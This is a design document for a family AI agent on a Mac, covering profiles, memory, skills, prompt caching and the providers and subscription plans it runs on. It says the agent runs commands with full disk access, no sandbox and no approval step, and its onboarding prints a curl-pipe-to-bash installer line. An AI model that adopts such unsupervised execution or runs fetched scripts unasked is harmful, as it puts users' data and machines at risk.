# btw-agent design

A small agent that runs on one Mac and does things on it for a family. One gateway process serves
a web UI. Family members share **profiles**. Each profile has its own conversations, workspace
folder, skills and memory. The agent has a single tool, `run_command`.

## Decisions

| Area               | Decision                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Execution          | Commands run as the gateway's macOS user with full access to the disk and no approval step. There is no sandbox. The profile folder is only the default working folder. A "smart mode" that auto-approves or rejects commands may come later.                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Clients            | Family members use the web UI only. The CLI is for the owner and for the agent itself (skill templates, self-configuration, which the built-in `btw-agent` skill explains).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| Exposure           | Public through a tunnel on a VPS. Every route requires login. The sign-up endpoint is disabled: accounts are created only with the local CLI, and passwords must be long and strong.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Profiles           | Any user can create a profile. Any member can add or remove members, rename the profile, or delete it. Deleting moves the folder to `~/.btw-agent/trash/` instead of erasing it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| Conversations      | Shared by every member of the profile. Messages go through a queue, and a message sent while the agent is working is fed into its next step (steering). Anyone can press Stop.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Sender identity    | Every human message is sent to the model as `Name: text`. Attached files come first, each as a line saying who attached it and where it was saved, followed by the picture or PDF itself when the model gets one. Display names are unique across the gateway.                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Attachments        | Any file, up to 100 MB and 10 per message, saved in the profile's `attachments` folder. btw keeps a copy of each picture and PDF the model gets and sends it by reference: through the provider's Files API (base64 only if an upload fails), whichever provider the chat moves to; the plans have none, so pictures go inline, and PDFs too on the Claude plan and as their path on the ChatGPT plan. Every other file goes as its path.                                                                                                                                                                                                                                                                      |
| Providers          | Anthropic, OpenAI and OpenRouter (API keys), and two plans, someone's own subscription instead of a key (see [Plans](#plans)): `claude-plan`, a Pro or Max plan signed in to Claude Code on this computer, and `chatgpt-plan`, a ChatGPT plan signed in to OpenAI's Codex there, each of which btw runs. Keys and model presets are global and managed by the admin with the CLI or the `/admin` page (Models & keys). A preset has a name (default `<model> (<provider>)`), a provider, a model, and an optional window override. One preset is the default (the oldest until an admin picks one): new chats start with it, and automations without a preset use it. See [Model providers](#model-providers). |
| Preset switching   | Allowed at any time, from the model chip in a chat's composer (or `btw agent run <id> --preset` for a subagent). The next model call uses the new model, and another provider gets the history translated. See [Switching models](#switching-models).                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Reasoning          | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once, so the chat asks first.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| System prompt      | Built once when the conversation is created: instructions, the profile's soul, the skills catalog and, for a chat in a folder, the folder's instructions and file paths. **It is not changed afterwards, and no update notices are added,** with one exception: when the chat moves to another folder, or its folder or the soul changes, it is built again at the start of the next turn (one cache miss). If skills change in another conversation, this conversation only sees it by running commands. Of memory, only `core` and the note names are in it: chats outside folders share a prompt.                                                                                                           |
| Memory             | Short Markdown notes per profile, one per topic, that the agent reads and changes with `btw memory`, like any other command. The system prompt has the pinned `core` note in full and lists the others by name, so the agent reads the ones it needs. The family sees and edits them on the Memory page. See [Memory](#memory).                                                                                                                                                                                                                                                                                                                                                                                |
| Soul               | Who btw is for a profile (character, values, tone), in `soul.md` in its folder, at most 4,000 characters. It opens every chat's system prompt. The family edits it in the profile's settings; the agent changes it itself with `btw soul write` and says so. See [Soul](#soul).                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Folders            | Group a profile's chats, like ChatGPT's projects. A folder has instructions and files; its chats get the instructions and the files' paths (never the files themselves) in their system prompt. Chats are dragged into folders in the sidebar or started in one. See [Folders](#folders).                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Skills             | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.btw-agent/profiles/<slug>/skills`, `~/.agents/skills` and the built-in skills (`packages/core/skills`: `automations`, `view-images`, `generate-images`, `subagents`, `btw-agent`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `btw skill new`.                                                                                                                                                                                                     |
| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. Web pictures only from links the agent found, never from the local network. The agent looks at pictures itself with `btw view`, which attaches them to that command's result. There is no tool for either.                                                                                                                                                                                                                                                                                |
| Web search         | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| Background work    | `run_command` takes `run_in_background` (new chats): the call returns at once, and the command's output joins the conversation as a message when it ends. See [Background commands](#background-commands).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| Subagents          | `btw agent run` starts another agent in a hidden conversation of its own that starts with only its task, and caches its prompt for 5 minutes. The agent hears back by running `btw agent watch` in the background, and can steer it and read its log. No new tool. See [Subagents](#subagents).                                                                                                                                                                                                                                                                                                                                                                                                                |
| Making pictures    | The agent runs `btw generate image` (OpenAI's Image API, `gpt-image-2.5-flare` by default; each other provider would be one more module). Templates belong to the Images page, which turns one and its settings into a finished prompt in the message it sends; the CLI knows nothing about them.                                                                                                                                                                                                                                                                                                                                                                                                              |

## Files on disk

```
~/.btw-agent/                 (override with BTW_HOME)
  config.json                 auth secret, Anthropic, OpenAI and OpenRouter keys, image model,
                              extra env vars for commands, where Claude Code and Codex are if set
                              (mode 600)
  codex/                      Codex's home for the ChatGPT plan: its sign-in (which btw never
                              reads), and the chats' threads under sessions/
  btw.db                      SQLite: users, sessions, profiles, presets, folders, conversations,
                              messages, media, uploads, provider files, triggers, trigger runs,
                              notifications, subagents, running background commands
  media/<sha256>              copies of the pictures and files shown in chats, and of attached
                              files not sent yet
  image-templates/<id>/       Images page templates for every profile (TEMPLATE.md, cover.webp)
  bin/btw                     shim so the agent can run `btw` from any command
  profiles/<slug>/            default working folder for commands in this profile
    soul.md                   who btw is for this profile; opens every chat's prompt
    memories/<topic>.md       long-term memory: one note per topic
    memories/core.md          the pinned note, copied into every new chat's prompt
    memories/.facts.json      when each fact in memory was first seen
    memories/.suggestions.json  each member's new-chat chips, and the memory they were made from
    skills/<name>/SKILL.md
    attachments/              files people attached to messages
    image-templates/<id>/     this profile's own templates
    images/                   what `btw generate image` made
    folders/<folder>/         files added to a chat folder
    agents/<chat>/<id>.log    what each subagent said and ran (no reasoning), for the agent that
                              started it; <chat> is the first 8 characters of that chat's id
  trash/<slug>-<timestamp>/   deleted profiles (and deleted folders' files)
~/.agents/skills/<name>/SKILL.md   global skills, visible to every profile
```

The folder name is a slug that is fixed when the profile is created. Renaming a profile changes
only its display name, so the skill paths already in system prompts stay valid.

The profile also stores its assistant's avatar (`profile.avatar`, one of eight names). A new profile
gets the one its slug picks; see [Assistant avatars](#assistant-avatars).

Every skill is on in every profile until someone turns it off, on the profile's Skills page or with
`btw skill disable`. The profile stores the names it turned off (`profile.disabled_skills`), so skills
added later start out on. Skills that are off are left out of the catalog when a conversation is
created; conversations already running keep the catalog they started with.

## Prompt caching

The rule: **the request prefix must stay byte-identical, so history is only ever appended to.**

- Order of the request: `tools` → `system` → `messages`, the first two the conversation's own
  saved copies. Tools are saved with each chat (`conversation.tools`) like its system prompt, because
  a thinking block is bound to the tools it was made with: changing them for an existing chat would
  cost it a cache miss and, on Opus 5.5 and Fable 5.1, invalidate the thinking in its history (a
  400 on accounts created since 2026-08-31). So a new version of btw that changes a tool only
  reaches new chats. Chats from before tools were saved send the first `run_command`
  (`RUN_COMMAND_TOOL_V1`, which must never change); new ones get the one with `run_in_background`.
- Each assistant response is stored as the exact `content` JSON the API returned, thinking blocks and
  their signatures included, and is sent back unchanged to the model that wrote it. btw's own rows
  are stored in its own format and turned into the provider's the same way on every call (see
  [btw's format](#btws-format)). Command output is truncated once, when the tool result is
  created, and never later.
- Cache markers: `cache_control: {type: "ephemeral", ttl: "1h"}` on the system block, plus the same
  setting at the top level of the request (automatic caching of the growing tail). Both use the
  same TTL, because the API requires longer-TTL entries to come before shorter ones. The TTL is
  per conversation (`conversation.cache_ttl`): an hour for chats, where people answer minutes
  apart, and 5 minutes for subagents, whose steps follow each other within seconds, so the
  cheaper 5-minute write (1.25x the input price, against 2x for an hour) is enough.
- Tool definitions, cache TTL and system prompt are fixed per conversation (the prompt is built
  again only when the chat's folder changes; see [Folders](#folders)), and the model changes only
  when someone switches it (see [Switching models](#switching-models)). Thinking uses
  `adaptive` with `display: "summarized"`, the same for every conversation. The only per-conversation
  knob is `effort`.
- Steering messages, stop results and restart-recovery results are **appended** as new rows. Nothing
  is ever edited or deleted. Opus 5.5 and Fable 5.1 require this anyway for "preserved thinking":
  replaying a thinking block after its prefix changed returns a 400 on newer accounts.
- Every assistant row stores `usage`, and the gateway logs `cache_read` / `cache_write` and the hit
  rate for every call. The chat header shows the hit rate (tooltip: last reply and whole conversation),
  and a reply is marked as a cache miss when it read less than the previous call read or wrote, with
  the likely cause: over an hour idle (the TTL) or a changed request such as a new model or
  reasoning level.

### On OpenAI

OpenAI's prompt cache is automatic, and the rule above is what keeps it working: `instructions`
(the system prompt), the tools, then the input items, with only the input growing. Requests carry
`prompt_cache_key` (the conversation's id), which keeps a conversation's calls on the same cache.
`cacheTtl` and the cache markers are Anthropic's alone. Usage reports `cached_tokens` (and, on
newer models, `cache_write_tokens`) inside `input_tokens`; btw subtracts them, so the chat's
numbers mean the same for both providers.

### On OpenRouter

The same rule, over Chat Completions: the system message, the tools, then the messages, with only
the messages growing. Claude only caches what's marked, so for `anthropic/` models (and their
`~anthropic/` aliases) the system message carries `cache_control` with the conversation's TTL,
and so does the request's top level (automatic caching of the growing tail), as with Anthropic's
own API. Other models (OpenAI's, Gemini, DeepSeek, Grok...) cache on their own and get no
markers. Requests carry `session_id` (the conversation's id), which keeps a conversation on the
same provider behind OpenRouter, whose cache holds its earlier calls. Usage reports
`cached_tokens` and `cache_write_tokens` inside `prompt_tokens`; btw subtracts them, as for OpenAI.

## Model providers

A conversation runs on its preset's provider until someone switches it to another preset (see
[Switching models](#switching-models)). `models.ts` is what the rest of btw calls: it picks the
provider's module (`anthropic.ts`, `openai-chat.ts`, `openrouter.ts`) for the model call, the
chat's title, PDF token counts, model checks and what the model can be sent, and gets back the
same shape from each (the reply's content, its stop reason in Anthropic's words, usage, tool calls
and texts). Each API provider brings a `FileStore` for pictures and PDFs (see
[Attachments](#attachments)). The plans are different: the plan maker's own agent (Claude Code in
`claude-plan.ts`, Codex in `chatgpt-plan.ts`) runs the agent loop, so the runner hands it whole
turns (`runPlanTurn`; see [Plans](#plans)).

- **What's stored.** What btw writes itself is in btw's own format, and replies exactly as their
  provider returned them; each provider's module turns both into its request (see
  [btw's format](#btws-format)).
- **Both SDKs load on first use** (`@anthropic-ai/sdk` in `anthropic.ts`, `openai` in
  `openai-chat.ts` and `openrouter.ts`), not when core loads: the bundled CLI carries all of
  core, and most `btw` commands the agent runs never call a model. Loading OpenAI's up front made
  each of them about 50 ms slower (lazily, the cost is Node parsing its code, around 10 ms).
  Anthropic's is lighter (about 2 ms saved) and loads the same way, so the modules match. Error
  classes are checked only once their SDK is loaded, since before that no error can be one of
  them.
- **OpenAI** (`openai-chat.ts`) uses the Responses API through OpenAI's SDK (`openai`), which
  also retries overloads, rate limits and dropped connections, like Anthropic's. Requests are
  stateless (`store: false`), so every call sends the whole transcript, as with Anthropic, and
  nothing depends on OpenAI keeping a conversation. Reasoning comes back encrypted
  (`include: ["reasoning.encrypted_content"]`) and goes back with the reply's other items,
  unchanged. btw's own blocks become input items the same way on every call (`toResponsesInput`):
  text as `input_text`, pictures as `input_image`, PDFs as `input_file`, command results as
  `function_call_output` (pictures from `btw view` included). `run_command` is sent as a function
  tool built from the saved Anthropic definition, not strict, since `cwd` and the timeout are
  optional.
- **Reasoning** on OpenAI is `reasoning.effort`, with the same five levels, and
  `summary: "auto"`, which the chat shows as thinking. An organization that must be verified
  before it gets summaries refuses them; btw then asks without them for the rest of the
  process's life, so replies still reason but the chat has nothing to show. GPT-4 and chat-tuned
  models get no reasoning settings. A rebuilt system prompt doesn't drop OpenAI's reasoning (it
  isn't bound to the prompt, unlike Claude's thinking).
- **What OpenAI doesn't have.** Its models API doesn't give a context window. btw knows the
  flagships' (`knownContextWindow`): every one since GPT-5.4 (`gpt-5.4`, `gpt-5.5-pro`,
  `gpt-6-astra`, their dated snapshots) has 1,050,000 tokens. Other models (mini, nano, codex,
  older ones) can have far less, and a window set too large would let a conversation grow past
  what the model takes, for good, since history is never edited; so they get one only when the
  admin sets it. Without one, the chat's context meter shows "?" and PDFs share 25% of 200k
  tokens. Titles are asked for at `low` effort.
- **OpenRouter** (`openrouter.ts`) serves models from many providers behind one key, through its
  Chat Completions API. OpenAI's SDK speaks it, pointed at `https://openrouter.ai/api/v1` (or
  `OPENROUTER_BASE_URL`), so it brings the same retries and server-sent events; its errors are
  that SDK's classes too, so `models.ts` asks `openrouter.ts` first, which remembers the errors
  its own calls threw. Its Responses API isn't used: it's OpenAI's shape, documented for
  OpenAI's models. Like the others, every call sends the whole transcript.
- **What an OpenRouter reply is stored as.** A reply is one assistant message, stored as its
  pieces: its `reasoning_details` as they came (`reasoning.text` with Claude's signature,
  `reasoning.summary`, `reasoning.encrypted`), then its text as a `text` block, then its
  `tool_calls` (`function`). They stream in pieces keyed by `index` and are put together as they
  arrive. They go back as one assistant message (`content`, `tool_calls`, `reasoning_details`),
  the details unchanged and in order, which Claude and Gemini need to go on after a tool call.
  They go back only to the model that wrote them; any other model (the chat switched) gets the
  reply's text and calls (`portableReply`). Through OpenRouter a reasoning detail may be Claude's
  thinking, bound to the system prompt, so details from before a rebuilt prompt are left out
  (`beforePromptChange`), like thinking. A reply that was only reasoning has nothing to send and
  is skipped.
- **btw's format on OpenRouter** (`toChatMessages`). Text becomes `text` parts, command results
  `tool` messages. An uploaded picture or PDF becomes a `file` part with its `file_id` (Chat
  Completions takes pictures that way too); a picture that couldn't be uploaded goes as an
  `image_url` part with a data URL, and one another provider's Files API holds as a note. A tool
  message takes only text, so the pictures `btw view` attached to a result follow, each after the
  line naming it, in the user message after the results. `run_command` is sent as a function
  tool, as for OpenAI. Before `resolveFiles` gives OpenRouter its copies, `readableMessages` turns
  the pictures and PDFs the model can't take into notes: a chat that switched to a text-only
  model may hold them, and a request carrying one would fail.
- **Reasoning** on OpenRouter is `reasoning.effort`, with the same five levels, which OpenRouter
  maps for each model (a thinking budget for older Claude models, say) and ignores for models
  that don't reason. The chat shows `reasoning.text` and summaries as thinking; encrypted
  reasoning has nothing to show. Requests set no `max_tokens`, so OpenRouter allows the model's
  own maximum: an account with too few credits for that gets a 402, which btw shows with where
  to add credits.
- **Models on OpenRouter.** Adding a preset reads OpenRouter's model list (`GET /models`), which
  says what each model takes: btw refuses one that can't call tools, since the agent works
  through `run_command`, and takes the smaller of the model's `context_length` and its top
  provider's as the window. A variant (`:nitro`, `:online`) is looked up as its model unless it's
  listed itself. The list is kept for an hour for what the model can be sent (see
  [Attachments](#attachments)). Titles are asked for at `low` effort with 2,048 tokens.
- **Another provider** (Gemini) would be one more module next to these, with a
  function turning btw's format into its request (Gemini's thought signatures would ride in
  `native` like OpenAI's encrypted reasoning), a branch in each of `models.ts`'s functions, a
  `FileStore` (or pictures inline), its key in `API_KEYS` (config.ts) with a check request in
  `api-keys.ts`, and its name in `PROVIDERS` and the schema's `provider` enums (a TypeScript list
  only: SQLite stores any text there).

### btw's format

`format.ts` defines what a conversation holds, whichever provider runs it: blocks (`text`,
`image`, `pdf`, `reasoning`, `tool_call`, `tool_result`) in messages. A picture's or PDF's source
is `media` (kept by btw, which `resolveFiles` turns into each provider's copy before a request),
`inline` (base64, which every provider takes) or `uploaded` to one provider's Files API (rows
from before btw kept its own copies). Each
provider's module turns messages into its request, leaving out what it can't take:
`toAnthropicMessages` in `anthropic.ts` (Claude Code on a Claude plan gets the same blocks, from
`toAnthropicBlocks`), `toResponsesInput` in `openai-chat.ts`, `toChatMessages` in
`openrouter.ts`, and `toCodexInput` in `chatgpt-plan.ts` (Codex on a ChatGPT plan, which takes
text and pictures). Nothing else in btw knows a
provider's shapes: the runner, the chat's display, plain-text transcripts and image limits all
read btw's format.

- **btw's own rows** (people's messages, attachments, command results, automations' and
  subagents' messages, notices, its own replies such as a notification continued in a chat) are
  stored in it, with `message.format` 'btw'.
- **Replies** are stored exactly as their provider returned them (`format` null), and read into
  btw's blocks with the original kept (`native`): only the model that wrote a reply reads its
  reasoning back, and only unchanged. The encoders send `native` to that model, and the blocks'
  text and calls (`portableReply`) to any other (see [Switching models](#switching-models)).
  Anthropic's, OpenAI's and OpenRouter's type names differ, so `replyBlocks` reads any of them
  without knowing who wrote it.
- **Rows from before btw's format** have btw's blocks in Anthropic's shape. They're read into btw's
  format the same way, and each block keeps what was stored (`storedAs`, in a `WeakMap`, never
  written anywhere), which `toAnthropicBlocks` sends as it is: Claude gets those rows byte for
  byte, as before, so old conversations keep their cache and thinking. A block btw has no type
  for (from those rows, or a result Claude Code wrote itself) is an `other` block that carries its
  Anthropic original and goes only to Claude. Stored rows are never rewritten.

### Plans

`claude-plan` and `chatgpt-plan` run chats on someone's own subscription instead of an API key.
Neither Anthropic nor OpenAI has other apps sign in to their accounts for this, so btw doesn't:
each plan runs its maker's own agent, installed on this computer and unmodified, which signs in,
keeps the sign-in, bills the plan and runs the agent loop, asking btw to run each command. The
two agents speak differently (below); what they share is in `plans.ts` and the runner:

- **One kind of turn.** The runner hands the agent a whole turn (`PlanTurn`, through
  `runPlanTurn` in `models.ts`): the chat's session, what it hasn't seen yet in btw's format (with
  `resolve`, which reads btw's copies of its pictures into it), btw's system prompt and tools, and
  callbacks that save each reply before its commands run, run a command and save the results, so
  the chat gets the same rows and live events as from btw's own loop. The session is
  `conversation.provider_session` (its id, the last row it was sent, and the plan whose agent has
  it), saved once the agent took the turn's input (`onStarted`). Only rows it hasn't been sent go,
  as one message; a turn that failed after the agent took its input is continued with
  `[Continue.]`. A chat the agent has never seen that already has replies (a notification opened
  as a chat, or replies from another model the chat used before) gets them first as a plain-text
  transcript, in a new session, and so does one whose session the agent lost
  (`planSessionProblem`). Messages sent while the agent works join after its turn, not at its next
  step.
- **Stop** interrupts the agent's turn and kills the running command, as elsewhere (a
  `PlanStopped`); an agent that hasn't ended the turn 5 seconds later is closed. A reply cut off
  mid-stream is dropped.
- **One kind of error.** Both turn whatever fails into a `PlanError` in words for the people in
  the chat, with the plan's own `kind` (`authentication_failed`, `usageLimitExceeded`...), so
  `describeApiError` and `shortApiError` know nothing about either.
- **One status.** `claudePlanStatus()` and `chatGptPlanStatus()` start the agent without sending
  anything and say where it is (`path`, `installed`), who it's signed in as (`signedIn`: "signed
  in as anna@example.com (Claude Max)", or "(ChatGPT Plus)", from `describePlanAccount`) and what
  stops chats on it (`problem`). Adding a preset checks the same, since nothing is billed.
- **The same commands and page.** `btw <plan> status` and `btw <plan> setup` (or
  `btw setup --provider <plan>`) for both (`packages/cli/src/plans.ts`), printing the same line,
  and `btw config set claude-path|codex-path` for an agent btw doesn't find. `chatgpt-plan` adds
  `logout` and `models`, which Codex has. Models & keys has one Plans list with a row for each.
- **Finding the agent.** The configured path, else the PATH and its installers' folders, since
  the gateway may run without a login shell's PATH (as a LaunchAgent). Without one, every one of
  the above says so and how to install it; at a terminal, setup offers the maker's installer,
  asking first.
- **No Files API.** Pictures go inline for both, within the conversation's 20 MB. PDFs go inline
  on the Claude plan and as their path on the ChatGPT plan, since Codex takes text and pictures
  only.
- **What's different.** The context window isn't known before a call, except for Claude Code's
  1M-context models, whose ids say so (`claude-opus-5-5[1m]`), so the context meter shows "?"
  (and PDFs get 25% of 200k tokens) unless the preset sets one. Titles are asked for through
  the agent too, as one exchange without a session. Plan limits assume one person's ordinary use,
  so the help, the page and the docs suggest keeping busy automations and subagents on an API key
  preset.

### The Claude plan

`claude-plan` presets run chats on the Pro or Max plan (Team and Enterprise work the same) that
someone signed in to Claude Code with on this computer, instead of an API key. Anthropic doesn't
let other apps sign in to Claude accounts or hold their tokens, so btw doesn't: it runs the
installed Claude Code, unmodified, through the Claude Agent SDK
(`@anthropic-ai/claude-agent-sdk`, in `claude-plan.ts`), and Claude Code signs in and bills the plan
itself. Anthropic's help center counts this as Agent SDK use of the subscription, which draws from
the plan's usage limits (a separate monthly Agent SDK credit was announced for June 2026, then
paused). Those limits assume one person's ordinary use, which is why the docs suggest keeping busy
automations and subagents on an API key preset.

- **Who runs the loop.** Claude Code. Each turn is a `query()` that resumes the chat's Claude Code
  session, whose id btw picks: at first the chat's own.
- **What the model gets.** btw's system prompt and the chat's saved `run_command` definition, as an
  in-process MCP tool (`mcp__btw__run_command` to the model). Claude Code's built-in tools, settings
  files, CLAUDE.md, skills and MCP servers are left out (`tools: []`, `settingSources: []`,
  `strictMcpConfig`, `dontAsk` permissions with only that tool allowed). Claude Code adds a short
  line of its own to the system prompt and an environment note (working folder, date). The
  working folder is the profile's, like commands'.
- **The same rows.** btw turns the stream into its own rows and live events: each model call's
  reply is saved (the tool's name back to `run_command`) before its commands run, then one
  `tool_results` row with every result, as in btw's loop. Claude Code starts a tool as soon as its
  block is complete, so btw's handler waits until the reply is saved (at `message_stop`, or when a
  reply came whole). Commands run one at a time through `runToolCall`, with live output, `btw view`
  pictures (inline) and background commands as usual.
- **Environment.** Claude Code gets btw's environment without `ANTHROPIC_API_KEY` and
  `ANTHROPIC_AUTH_TOKEN`, which it would use (and bill) instead of the plan. A
  `CLAUDE_CODE_OAUTH_TOKEN` there (from `claude setup-token`) reaches Claude Code but, like API
  keys, not the agent's commands. btw looks for `claude` on the PATH and in its installers'
  folders (`~/.local/bin`, `~/.claude/local`, Homebrew), or at `btw config set claude-path`. The
  SDK's own copy of Claude Code (about 230 MB per platform) isn't shipped, so the Claude Code
  people keep up to date is the one that runs.
- **Errors.** Claude Code reports API errors as a reply of its own (`error: authentication_failed`,
  `rate_limit`...), which btw shows as the chat's error, with how to sign in when that's the
  problem. `btw claude-plan status`, the admin page's Check sign-in and adding a preset start
  Claude Code without sending anything and ask who it's signed in as (`accountInfo()`): a plan
  (`Claude Max`...) or a `claude setup-token` token passes; an API key, another provider or no
  sign-in ("Claude API") doesn't. Whether it takes the model only shows at the chat's first reply.
- **Onboarding.** Without Claude Code, every one of those says so and how to install it; btw never
  falls back to the SDK's own copy. At a terminal, `btw setup --provider claude-plan` and
  `btw claude-plan setup` offer what's missing, asking before each: Anthropic's installer
  (`curl -fsSL https://claude.ai/install.sh | bash`, which puts it in `~/.local/bin`, where btw
  looks even when the PATH doesn't), then Claude Code's own sign-in (`claude auth login
--claudeai`), which opens Anthropic's page in a browser and keeps what it gets. The admin page
  shows the same steps but can't sign in itself: relaying Claude's sign-in through btw's web page
  would be btw handling it.
- **Pictures and PDFs** go inline as base64, since there's no Files API: btw's copies are read
  into the request (`resolveFiles`). Claude Code passes them to the model as they are, and
  `btw view` pictures come back in `run_command`'s MCP result as images. They count against the
  conversation's inline limit (20 MB, which keeps requests under the API's 32 MB); a chat that
  moved to the plan with more than that sends the rest as notes, oldest first inline. A PDF's tokens can't be counted without the API, so they're estimated at 4,000 a page
  (Anthropic's 1,500 to 3,000 for a page's text, plus the page as a picture) from the page count in
  its page tree, read from the file (compressed object streams too), and checked against the same
  25% of the context window and the API's page limit. A PDF whose pages can't be counted
  (encrypted, say) goes as its path.
- **Its own copy.** Claude Code keeps each chat under `~/.claude/projects`, which deleting the
  chat in btw doesn't remove yet.

### The ChatGPT plan

`chatgpt-plan` presets run chats on a ChatGPT plan (Plus, Pro, Business, Enterprise) that
someone signed in to OpenAI's Codex with, instead of an API key. btw runs the installed Codex
(`npm install -g @openai/codex`, or Homebrew's), unmodified, through `codex app-server`: the
JSON-RPC interface over stdio that Codex's own IDE extension uses and OpenAI documents for
integrations (`codex-app-server.ts` carries the messages, `chatgpt-plan.ts` says what to ask).
Codex signs in with ChatGPT, keeps the sign-in fresh and bills the plan's Codex limits itself.

- **Codex's home.** btw gives Codex a home of its own (`CODEX_HOME=~/.btw-agent/codex`), apart
  from the owner's `~/.codex`: its sign-in, settings and threads are btw's alone, and btw's chats
  don't show up in the owner's Codex. btw never reads the sign-in there.
- **Who runs the loop.** Codex. A chat is a Codex thread, whose id Codex picks: a turn starts one
  (`thread/start`) or resumes the chat's (`thread/resume`), starts a turn with the new input
  (`turn/start`) and follows its events until `turn/completed`. A thread Codex no longer has ("no
  rollout found") is a lost session. Codex runs for one turn and is closed after, like Claude
  Code. It sets up its home's state database as it starts, which two starting at once trip over,
  so btw starts one at a time, and starts again once a Codex that ended while starting.
- **What the model gets.** btw's system prompt as Codex's base instructions, and the chat's saved
  `run_command` as a dynamic tool (`dynamicTools`, in a `btw` namespace; experimental in Codex, so
  btw opts in with `experimentalApi`). Codex's own tools that act on the computer or reach out are
  off, from its command line so no config.toml turns them back on (`-c features.shell_tool=false`
  and so on: shell, pictures, image generation, web search, browser and computer use, apps,
  plugins, skills, goals, sub-agents), AGENTS.md files aren't read (`project_doc_max_bytes=0`),
  and turns have no execution environment (`environments: []`), which also leaves out
  `apply_patch`. What's left is Codex's harness: the model calls tools from short scripts
  (`exec`, and `wait` for a long one), which reach btw as `item/tool/call` requests. The thread's
  sandbox is read-only with approvals off, since Codex itself runs nothing. Codex adds notes on
  permissions and the environment (date, time zone).
- **The same rows.** btw saves what Codex streams as OpenAI's output items (`reasoning`
  summaries, `message`, a `function_call` for each command), which the chat reads as it reads
  OpenAI's replies. A command's reply is saved when Codex asks to run it, with what the model said
  since the last one; a script may ask for several at once, but btw runs them one at a time, each
  with a reply and results of its own. Results go back as Codex's content items: text, and `btw
view` pictures as data URLs. Deltas (`item/agentMessage/delta`, reasoning summaries) are the
  live reply.
- **Pictures** go to Codex as data URLs, read from btw's copies (`resolveFiles`) within the
  conversation's inline limit, in messages and in command results. A PDF, and a picture from before
  btw kept its own copies (held by another provider's Files API), becomes a note saying where its
  file is, since Codex takes text and pictures only.
- **Usage.** Codex says what a model call used (`thread/tokenUsage/updated`) only once the
  commands it asked for have finished, after btw saved the reply that asked for them. So only the
  reply that ends a turn has usage, its own call's, and a chat's totals leave out calls that asked
  for commands. Codex caches prompts itself.
- **Environment.** Codex gets btw's environment without `OPENAI_API_KEY` and `CODEX_API_KEY`,
  which it would use (and bill) instead of the plan. npm's `codex` is a Node script, so the Node
  that runs btw goes on its PATH, and its folder is where btw looks for `codex` too.
- **Signing in** is Codex's own device code flow through the app server (`account/login/start`
  with `chatgptDeviceCode`): Codex asks OpenAI for a one-time code, someone signed in to ChatGPT
  enters it at `auth.openai.com/codex/device` on any device, and Codex saves the sign-in
  (`account/login/completed`). Nothing redirects back to this computer, so it works through a
  tunnel, from a phone and from the agent's commands. A sign-in under way is a Codex waiting for
  its code in the process that started it: the gateway for Models & keys, which asks again every
  few seconds until the code is entered, or `btw chatgpt-plan setup`, which prints the link and
  the code and waits. Signing out is Codex's (`account/logout`). The status is Codex's
  `account/read`: a ChatGPT account passes, named with its plan (`plus`: "ChatGPT Plus"); an API
  key doesn't.
- **Models** are the ones Codex lists (`model/list`, with the ones its picker hides): adding a
  preset checks the model is there. Codex doesn't say their context windows.
- **Errors.** A failed turn's error (`codexErrorInfo`: `unauthorized`, `usageLimitExceeded`,
  `contextWindowExceeded`...) is shown in Codex's words, with how to sign in when that's the
  problem. Codex retries what can be retried itself.
- **Onboarding.** At a terminal, `btw setup --provider chatgpt-plan` and `btw chatgpt-plan setup`
  offer npm's installer (`npm install -g @openai/codex`), asking first, then sign in. The admin
  page shows the install command, and signs in itself, since the code is entered on OpenAI's
  page, never on btw's.
- **Its own copy.** Codex keeps each chat's thread under `~/.btw-agent/codex/sessions`, which
  deleting the chat in btw doesn't remove yet.

### Switching models

Anyone in the profile can switch a chat to another preset, or another reasoning level, from the
chip in its composer; `btw agent run <id> --preset` does it for a subagent given more work.
`setPreset` takes a new snapshot of the preset (name, provider, model, context window), and the
next model call uses it, even in the middle of a turn, so a model that keeps failing can be left
behind with Continue. It's refused when the conversation is already larger than the new model's
window (from its last call's usage): history is never edited, so it could never fit. Everyone who
has the chat open gets the change as a live `model` event (also in the snapshot).

- **What it costs.** Caches belong to one model, so the first call on the new one reads the whole
  conversation again (a new reasoning level does the same on Claude). Once the chat has a reply,
  the chat asks before either change, saying so (with the tokens, in technical details).
- **Who wrote what.** Every row records the provider its content was made for (`message.provider`:
  the one whose model wrote a reply, or whose Files API a message's or command result's pictures
  went to) and replies their model (`message.model`). Rows from before this were given their
  conversation's. The chat shows which model wrote each reply in technical details.
- **What each model gets.** `requestMessages` reads the rows into btw's format, and the target's
  encoder (see [btw's format](#btws-format)) decides what it can take. Both depend only on what's
  stored, so after the one miss the prefix is byte-identical again. Stored rows never change.
  - Claude gets replies from other Claude models as they are. The API itself leaves out thinking a
    model can't read (it's bound to the model that made it), without an error; stripping it would
    be an edit, which breaks preserved thinking for the model that can read it.
  - Replies from another provider go as their text and tool calls (`portableReply`), without
    reasoning. So do replies from another OpenAI model or another model on OpenRouter (reasoning
    goes back only to the model that wrote it, and items without their reasoning lose their ids)
